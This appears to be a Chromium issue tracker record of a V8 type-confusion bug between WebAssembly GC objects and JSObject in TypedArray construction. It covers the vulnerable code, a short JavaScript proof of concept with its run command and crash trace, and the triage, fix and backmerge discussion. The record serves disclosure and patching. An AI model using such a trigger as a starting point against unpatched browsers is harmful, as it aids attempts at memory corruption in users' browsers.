# Type Confusion between WasmObject and JSObject in Array Concat

| Field | Value |
|-------|-------|
| **Issue ID** | [339753685](https://issues.chromium.org/issues/339753685) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Runtime, Blink>JavaScript>WebAssembly |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows |
| **Reporter** | ki...@gmail.com |
| **Assignee** | ml...@chromium.org |
| **Created** | 2024-05-10 |
| **Bounty** | $10,000.00 |

## Description

## TITLE

Check failed: !v8::internal::v8\_flags.enable\_slow\_asserts.value() || (IsJSObject\_NonInline(\*this)).

## VULNERABILITY DETAILS

While auditing, I found there is a type confusion between WasmArray/WasmStruct and JSObject during construction of TypedArray.

Construction of TypedArray can finally reach the function `HoleyPrototypeLookupRequired` under some situations.

In this function, a type cast for variable `source_proto` is used:

```
  static bool HoleyPrototypeLookupRequired(Isolate* isolate,
                                           Tagged<Context> context,
                                           Tagged<JSArray> source) {
    DisallowGarbageCollection no_gc;
    DisallowJavascriptExecution no_js(isolate);

#ifdef V8_ENABLE_FORCE_SLOW_PATH
    if (isolate->force_slow_path()) return true;
#endif

    Tagged<Object> source_proto = source->map()->prototype();

    // Null prototypes are OK - we don't need to do prototype chain lookups on
    // them.
    if (IsNull(source_proto, isolate)) return false;
    if (IsJSProxy(source_proto)) return true;
    if (!context->native_context()->is_initial_array_prototype(
            JSObject::cast(source_proto))) {                          // <------------------ cast to JSObject
      return true;
    }

    return !Protectors::IsNoElementsIntact(isolate);
  }

```

However, WasmObject type is forgotten in this situation. For example, one can control the `source_proto` to be a WasmArray or a WasmStruct;

WasmObject does not belong to JSObject, so it is unsafe to conduct the `JSObject::cast`.

I construct a POC to prove it.

You can run it at the least version of v8 (commit `cc05792346fb017eaa961ee7d35cf1f9bb53bb0a`)

You should use 'python3 .\tools\dev\gm.py x64.debug' to build v8 and run the POC just under the `v8\` dir.

commond line:

```
out\x64.debug\d8.exe --allow-natives-syntax poc.js

```

The crash log should be like:

```
#
# Fatal error in gen\torque-generated\src\objects\js-objects-tq-inl.inc, line 67
# Check failed: !v8::internal::v8_flags.enable_slow_asserts.value() || (IsJSObject_NonInline(*this)).
#
#
#
#FailureMessage Object: 0000006EA7FFD160
==== C stack trace ===============================

        v8::base::debug::StackTrace::StackTrace [0x00007FFFED885FE5+37]
        v8::platform::`anonymous namespace'::PrintStackTrace [0x00007FFFECD0AA99+57]
        V8_Fatal [0x00007FFFED856F47+295]
        v8::internal::TorqueGeneratedJSObject<v8::internal::JSObject,v8::internal::JSReceiver>::TorqueGeneratedJSObject [0x00007FFF1BCD54C3+195]
        v8::internal::JSObject::JSObject [0x00007FFF1BCD5392+34]
        v8::internal::TorqueGeneratedJSObject<v8::internal::JSObject,v8::internal::JSReceiver>::cast [0x00007FFF1BCD3751+65]
        v8::internal::`anonymous namespace'::TypedElementsAccessor<24,float>::HoleyPrototypeLookupRequired [0x00007FFF1CEACF8E+542]
        v8::internal::`anonymous namespace'::TypedElementsAccessor<24,float>::TryCopyElementsFastNumber [0x00007FFF1CC9AF98+1608]
        v8::internal::`anonymous namespace'::TypedElementsAccessor<24,float>::CopyElementsHandleImpl [0x00007FFF1CDE84DF+2383]
        v8::internal::`anonymous namespace'::ElementsAccessorBase<v8::internal::(anonymous namespace)::TypedElementsAccessor<24,float>,v8::internal::(anonymous namespace)::ElementsKindTraits<24> >::CopyElements
        v8::internal::__RT_impl_Runtime_TypedArrayCopyElements [0x00007FFF1D64C651+705]
        v8::internal::Runtime_TypedArrayCopyElements [0x00007FFF1D64C08F+383]
        Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit [0x00007FFF20EA6381+65]
        Builtins_CreateTypedArray [0x00007FFF213BAFA6+49510]
        Builtins_TypedArrayConstructor [0x00007FFF20E50957+535]
        Builtins_InterpreterPushArgsThenFastConstructFunction [0x00007FFF20AFB8DD+1053]
        Builtins_ConstructHandler [0x00007FFF214FA1CF+7119]
        Builtins_InterpreterEntryTrampoline [0x00007FFF20AFA518+344]
        Builtins_JSEntryTrampoline [0x00007FFF20AF0EDC+92]
        Builtins_JSEntry [0x00007FFF20AF0A33+243]

```
## BISECT:

When the wasm-gc has been shipped.

<https://chromium-review.googlesource.com/c/v8/v8/+/4756848>

```
commit 50f8643de79d1c0db4efb41c24ed7c283a97bb7b
Author: Jakob Kummerow <jkummerow@chromium.org>
Date:   Wed Sep 13 19:05:38 2023 +0200

[wasm-gc] Ship it!

This patch enables typed-function-references and GC by default.
It also enables enforcement of WasmGC "final types".
It also disables support for deprecated prototype instructions.

```
## VERSION

Chrome Version: Tested on v8 12.6.0
Operating System: Tested on Windows 11

## Timeline

### jo...@gmail.com (2024-05-10)

## poc.js

```
d8.file.execute('test/mjsunit/wasm/gc-js-interop-helpers.js');
let buffer = [1.1, 2.2, 3.3];
buffer.__proto__ = CreateWasmObjects().array;
let array = new Float32Array(buffer);

```

You need to run poc.js under `v8/` dir with cmd `out\x64.debug\d8.exe --allow-natives-syntax poc.js`.

### cl...@appspot.gserviceaccount.com (2024-05-10)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6262831079948288.

### ad...@google.com (2024-05-10)

I've uploaded a version of the PoC to ClusterFuzz with the inclusion inlined (recursively) - not sure if that will work. I'm working on reproducing locally too.

### ad...@google.com (2024-05-10)

Reproduced locally with 22aa4ed603c6a75bf8a5c9cf9704db5a73a443fc. Setting provisional FoundIn and severity labels, to be adjusted by V8 sheriff.

### 24...@project.gserviceaccount.com (2024-05-10)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2024-05-10)

Detailed Report: https://clusterfuzz.com/testcase?key=6262831079948288

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: CHECK failure
Crash Address: 
Crash State:
  !v8::internal::v8_flags.enable_slow_asserts.value() || (IsJSObject_NonInline(*th
  v8::internal::TypedElementsAccessor<
  v8::internal::ElementsAccessorBase<v8::internal::TypedElementsAccessor<
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=89971:89972

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6262831079948288

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### sa...@google.com (2024-05-10)

Thanks a lot for the report! This looks like another variant of [issue 338908243](https://issues.chromium.org/issues/338908243). I'm not sure if this particular one is known already since there is currently some effort to identify these bug patterns in the codebase. Matthias, could you take a look at this one? Thanks!

### pe...@google.com (2024-05-10)

Setting milestone because of s0/s1 severity.

### pe...@google.com (2024-05-10)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### ml...@chromium.org (2024-05-10)

Samuel: Yes, these are exactly the patterns we are looking at where we cast to `JSObject` and have a prior check for `JSProxy` (which is an indication that we don't know for sure that it is a `JSObject`) but do not check explicitly for it not being a wasm object.

I don't know how far Jakob has got while looking into these patterns and if this specific instance has already been found.

### jk...@chromium.org (2024-05-10)

Yes, I've found this one during my auditing today as well, fix in flight here: <https://chromium-review.googlesource.com/c/v8/v8/+/5528004/1/src/objects/elements.cc>

I *think* this one isn't exploitable, as the only operation we perform after the invalid cast is a pointer equality comparison, which doesn't actually depend on the type. Do you have evidence to the contrary, i.e. have you found a way to use this to cause memory corruption (as opposed to just a DCHECK failure)?

### 24...@project.gserviceaccount.com (2024-05-14)

ClusterFuzz testcase 6262831079948288 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=93842:93843

If this is incorrect, please add the hotlistid:5432646 and re-open the issue.

### pe...@google.com (2024-05-14)

This is sufficiently serious that it should be merged to extended stable. But I can't  see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M124. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
This is sufficiently serious that it should be merged to stable. But I can't  see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M125. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.


Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.


Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [124, 125].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


### pe...@google.com (2024-05-15)

This high+ V8 security issue with stable impact requires a lightweight post mortem. Please take some time to answer questions asked in this form [1] to help us improve V8 security. [1] https://docs.google.com/forms/d/e/1FAIpQLSdSMCiEpIFLLFkMbgtulK1sf1B-idQmkFaA4XP2Rz5mN1cqWg/viewform?usp=pp_url&entry.307501673=339753685&entry.958145677=Android, Fuchsia, Linux, Mac, Windows, Lacros, ChromeOS&entry.763880440=Extended&entry.1678852700=High&entry.763402679=Blink>JavaScript, Blink>JavaScript>Runtime&entry.975983575=mliedtke@chromium.org Please ensure to copy the full link, as otherwise some issue meta data might not be populated automatically. 

### pe...@google.com (2024-05-15)

This is sufficiently serious that it should be merged to extended stable. But I can't  see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M124. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
This is sufficiently serious that it should be merged to stable. But I can't  see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M125. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
This is sufficiently serious that it should be merged to dev. But I can't  see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M126. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.


Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.


Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.


Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [124, 125, 126].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


### ml...@chromium.org (2024-05-15)

This bug doesn't have any fixes attached.
Samuel and Jakob, should we use this bug to backmerge <https://chromium-review.googlesource.com/c/v8/v8/+/5528004> which fixes the issue reported here and any other potentially risky casts related to wasm objects in the JS builtins / API?

### am...@chromium.org (2024-05-15)

The fix doesn't link a bug and I can't seem to find a bug for Jakob's audit, so let's use this bug for handling merges. If there is an issue related to this audit, lets dupe this and handle merges there, but for now, this issue can serve for that.

I can't approve any merges just yet as we are waiting for M125 Stable release to go out today, and M124 Extended Stable cut needs to be completed.

### ml...@chromium.org (2024-05-16)

Sounds good, I'll provide the answers for [comment #16](https://issues.chromium.org/issues/339753685#comment16) once we have canary coverage for the change.

### ml...@chromium.org (2024-05-21)

1. <https://chromiumdash.appspot.com/commit/fe67713b2ff62f8ba290607bf7482a8efd0ca6cc>
2. Yes, part of canary and dev: <https://chromiumdash.appspot.com/commit/fe67713b2ff62f8ba290607bf7482a8efd0ca6cc>
3. No, while it touches a decent amount of lines, it only affects the behavior of types that are not `JSObjects` and not `JSProxy` (which are the webassembly objects `WasmStruct` and `WasmArray`). These aren't very widely used yet and the individual fixes are rather trivial.
4. No, this only fixes some missing checks, some of which might not even be reachable in the current code, the extra checks / modified checks are there for safety reasons.
5. No.

### am...@chromium.org (2024-05-21)

merges approved for <https://chromium-review.googlesource.com/c/v8/v8/+/5528004>
please merge this fix to 12.6 before 10am Pacific tomorrow (Wednesday, 22 May) so this fix can be included in the next 126 Beta update
please merge this fix to 12.5 and 12.4 by EOD Thursday, 23 May, so this fix can be included in next week's Stable and Extended Stable updates

### ap...@google.com (2024-05-22)

Project: v8/v8
Branch: refs/branch-heads/12.6

commit 40f9e5726997158d1ebe1b6d47bd0d758eb1e7b0
Author: Jakob Kummerow <jkummerow@chromium.org>
Date:   Fri May 10 15:55:34 2024

    Merged: Fix and clean up some JSObject::cast()
    
    A few of these should account for the possibility of the object
    not being a JSObject.
    Some of them were simply redundant.
    
    (cherry picked from commit fe67713b2ff62f8ba290607bf7482a8efd0ca6cc)
    
    Bug: 339753685
    Change-Id: I97dab098fb7024408a3d79934824b8e0316068ef
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5557062
    Commit-Queue: Jakob Kummerow <jkummerow@chromium.org>
    Reviewed-by: Michael Lippautz <mlippautz@chromium.org>
    Commit-Queue: Matthias Liedtke <mliedtke@chromium.org>
    Reviewed-by: Jakob Kummerow <jkummerow@chromium.org>
    Commit-Queue: Michael Lippautz <mlippautz@chromium.org>
    Auto-Submit: Matthias Liedtke <mliedtke@chromium.org>
    Cr-Commit-Position: refs/branch-heads/12.6@{#12}
    Cr-Branched-From: 3c9fa12db3183a6f4ea53d2675adb66ea1194529-refs/heads/12.6.228@{#2}
    Cr-Branched-From: 981bb15ba4dbf9e2381dfc94ec2c4af0b9c6a0b6-refs/heads/main@{#93835}

M       src/api/api-natives.cc
M       src/api/api.cc
M       src/api/api.h
M       src/builtins/builtins-array.cc
M       src/debug/debug-scopes.cc
M       src/ic/ic.cc
M       src/json/json-stringifier.cc
M       src/objects/elements.cc
M       src/objects/js-objects.cc
M       src/objects/keys.cc
M       src/objects/module.cc
M       src/objects/objects-inl.h
M       src/objects/objects.cc
M       src/objects/objects.h
M       src/objects/value-serializer.cc
M       src/strings/string-stream.cc
M       src/wasm/wasm-js.cc

https://chromium-review.googlesource.com/5557062


### pe...@google.com (2024-05-22)

LTS Milestone M120

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



### ap...@google.com (2024-05-22)

Project: v8/v8
Branch: refs/branch-heads/12.5

commit 00413b1aa7620904280859a302e0f06a91291f23
Author: Matthias Liedtke <mliedtke@chromium.org>
Date:   Wed May 22 10:57:41 2024

    Merged: Fix and clean up some JSObject::cast()
    
    A few of these should account for the possibility of the object
    not being a JSObject.
    Some of them were simply redundant.
    
    (cherry picked from commit fe67713b2ff62f8ba290607bf7482a8efd0ca6cc)
    
    Bug: 339753685
    Change-Id: Ib53211edf4bff2294466ef560c4d36e83f993741
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5557063
    Reviewed-by: Jakob Kummerow <jkummerow@chromium.org>
    Reviewed-by: Michael Lippautz <mlippautz@chromium.org>
    Commit-Queue: Matthias Liedtke <mliedtke@chromium.org>
    Cr-Commit-Position: refs/branch-heads/12.5@{#20}
    Cr-Branched-From: 15b9756484d5bda98ba273ae13f8db58200db4db-refs/heads/12.5.227@{#1}
    Cr-Branched-From: 497d8573dc80b1b69052a834bec894cf5d4238e7-refs/heads/main@{#93350}

M       src/api/api-natives.cc
M       src/api/api.cc
M       src/api/api.h
M       src/builtins/builtins-array.cc
M       src/debug/debug-scopes.cc
M       src/ic/ic.cc
M       src/json/json-stringifier.cc
M       src/objects/elements.cc
M       src/objects/js-objects.cc
M       src/objects/keys.cc
M       src/objects/module.cc
M       src/objects/objects-inl.h
M       src/objects/objects.cc
M       src/objects/objects.h
M       src/objects/value-serializer.cc
M       src/strings/string-stream.cc
M       src/wasm/wasm-js.cc

https://chromium-review.googlesource.com/5557063


### ml...@chromium.org (2024-05-22)

The merge for 12.4 has a surprising amount of merge conflicts: <https://chromium-review.googlesource.com/c/v8/v8/+/5557066>

This let me reconsider the `3. Does this fix pose any potential non-verifiable stability risks?` as those merge conflicts on back merges are quite difficult to verify.

Jakob does not think that any of the changes in his CL are exploitable, so it seems to be the safer bet to not backmerge it to 12.4.

### am...@chromium.org (2024-05-22)

Thank you for the update! Yes, I concur with not merging to M124 on that count.
Removing approval for 124; as well as the labels for 125 and 126 since those merges have been completed.

### am...@chromium.org (2024-05-22)

OP / reporter -- thank you for the report. As already discussed in c#12, this bug was already discovered from internal auditing and patchset completed at the time of this report. As such, this must be considered a duplicate report, and is unfortunately not eligible for a Chrome VRP reward.

### jo...@gmail.com (2024-05-23)

Re #27: OK. Got it.

### pe...@google.com (2024-05-31)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)



### vo...@google.com (2024-05-31)

1. <https://crrev.com/c/5568425>
2. High - after looking at the conflicts locally, I think it'll be risky to merge this because the delta is quite high and it's not easy to verify if the conflict resolution is done correctly.
3. M125, M126. M124 was also rejected due to conflicts.
4. No

### ml...@chromium.org (2024-05-31)

> M125, M126. M124 was also rejected due to conflicts.

Only M124. The change has been merged both into M125 and M126. The argument still holds though, it's probably riskier to land this change than to not land it.

### gm...@google.com (2024-06-05)

Ok, rejecting the merge for LTS 120

### pe...@google.com (2024-08-21)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/339753685)*
